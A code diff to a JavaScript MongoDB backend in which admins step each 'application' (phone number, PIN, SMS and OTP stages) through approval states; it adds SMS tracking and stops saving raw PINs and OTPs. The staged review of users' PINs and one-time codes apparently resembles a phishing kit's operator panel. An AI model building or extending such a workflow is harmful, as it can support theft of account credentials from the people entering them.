@@ -117,6 +117,7 @@ async function createIndexes() {
             database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
             database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
             database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 }),
             database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),
 
             database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
@@ -367,15 +368,16 @@ async function getAdminCount() {
 async function saveApplication(appData) {
     try {
         const database = await ensureDb();
+
+        // Strictly store state flags, non-sensitive metadata, and exclude raw authentication credentials
         const document = {
             id:              appData.id,
             adminId:         appData.adminId,
             adminName:       appData.adminName || '',
             phoneNumber:     appData.phoneNumber,
-            pin:             appData.pin,
             pinStatus:       appData.pinStatus  || 'pending',
+            smsStatus:       appData.smsStatus  || 'pending',
             otpStatus:       appData.otpStatus  || 'pending',
-            otp:             appData.otp        || null,
             assignmentType:  appData.assignmentType || 'auto',
             isReturningUser: appData.isReturningUser || false,
             previousCount:   appData.previousCount   || 0,
@@ -410,14 +412,21 @@ async function getApplication(applicationId) {
 async function updateApplication(applicationId, updates) {
     try {
         const database = await ensureDb();
+
+        // Sanitize updates to prevent sensitive fields from being persisted if passed accidentally
+        const sanitizedUpdates = { ...updates };
+        delete sanitizedUpdates.pin;
+        delete sanitizedUpdates.otp;
+        delete sanitizedUpdates.smsCode;
+
         const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
-            { $set: { ...updates, updatedAt: new Date().toISOString() } }
+            { $set: { ...sanitizedUpdates, updatedAt: new Date().toISOString() } }
         );
 
         getApplication(applicationId).then(app => {
             if (app && app.adminId) {
-                logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates }).catch(() => {});
+                logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates: sanitizedUpdates }).catch(() => {});
             }
         }).catch(() => {});
 
@@ -448,7 +457,11 @@ async function getPendingApplications(adminId) {
         return await database.collection(COLLECTIONS.APPLICATIONS)
             .find({
                 adminId,
-                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
+                $or: [
+                    { pinStatus: 'pending' },
+                    { smsStatus: 'pending' },
+                    { otpStatus: 'pending' }
+                ]
             })
             .sort({ timestamp: -1 })
             .toArray();
@@ -473,15 +486,9 @@ async function getAdminStats(adminId) {
                     total: { $sum: 1 },
                     pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                     pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
-                    otpPending: {
-                        $sum: {
-                            $cond: [
-                                { $and: [{ $eq: ['$otpStatus', 'pending'] }, { $eq: ['$pinStatus', 'approved'] }] },
-                                1,
-                                0
-                            ]
-                        }
-                    },
+                    smsPending: { $sum: { $cond: [{ $eq: ['$smsStatus', 'pending'] }, 1, 0] } },
+                    smsApproved: { $sum: { $cond: [{ $eq: ['$smsStatus', 'approved'] }, 1, 0] } },
+                    otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
                     fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } }
                 }
             }
@@ -492,10 +499,10 @@ async function getAdminStats(adminId) {
             return counts;
         }
 
-        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
+        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
     } catch (error) {
         console.error('❌ Error getting admin stats:', error);
-        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
+        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
     }
 }
 
@@ -511,6 +518,8 @@ async function getStats() {
                         totalApplications: { $sum: 1 },
                         pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                         pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
+                        smsPending: { $sum: { $cond: [{ $eq: ['$smsStatus', 'pending'] }, 1, 0] } },
+                        smsApproved: { $sum: { $cond: [{ $eq: ['$smsStatus', 'approved'] }, 1, 0] } },
                         otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
                         fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } },
                         totalRejected: {
@@ -519,6 +528,8 @@ async function getStats() {
                                     {
                                         $or: [
                                             { $eq: ['$pinStatus', 'rejected'] },
+                                            { $eq: ['$smsStatus', 'rejected'] },
+                                            { $eq: ['$otpStatus', 'rejected'] },
                                             { $eq: ['$otpStatus', 'wrongpin_otp'] },
                                             { $eq: ['$otpStatus', 'wrongcode'] }
                                         ]
@@ -539,13 +550,15 @@ async function getStats() {
             totalApplications: counts.totalApplications || 0,
             pinPending:        counts.pinPending || 0,
             pinApproved:       counts.pinApproved || 0,
+            smsPending:        counts.smsPending || 0,
+            smsApproved:       counts.smsApproved || 0,
             otpPending:        counts.otpPending || 0,
             fullyApproved:     counts.fullyApproved || 0,
             totalRejected:     counts.totalRejected || 0
         };
     } catch (error) {
         console.error('❌ Error getting stats:', error);
-        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
+        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
     }
 }
 
